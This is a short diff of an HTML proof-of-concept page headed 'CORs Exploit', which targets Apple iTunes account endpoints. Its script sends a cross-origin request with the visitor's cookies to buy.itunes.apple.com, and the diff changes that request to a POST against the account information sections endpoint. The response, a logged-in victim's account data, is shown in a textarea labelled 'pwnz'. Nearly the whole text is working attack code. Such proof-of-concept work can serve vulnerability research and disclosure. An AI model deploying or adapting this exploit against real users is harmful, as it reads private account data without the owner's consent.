@@ -6,7 +6,8 @@
 <h2>CORs Exploit</h2>
   <h1></h1>
   <!-- https://xp.apple.com/config/1/report/xp_its_music_main           
-https://amp-account.music.apple.com/account/web/config -->
+https://amp-account.music.apple.com/account/web/config 
+https://buy.itunes.apple.com/account/web/infoRefresh-->
 <textarea rows="10" cols="60" id="pwnz">
 </textarea><br>
 <button type="button" onclick="cors()">Exploit</button>
@@ -20,7 +21,7 @@ function cors() {
       document.getElementById("pwnz").innerHTML = this.responseText;
     }
   };
-  xhttp.open("GET", "https://buy.itunes.apple.com/account/web/infoRefresh", true);
+  xhttp.open("POST", "https://buy.itunes.apple.com/account/information/sections", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
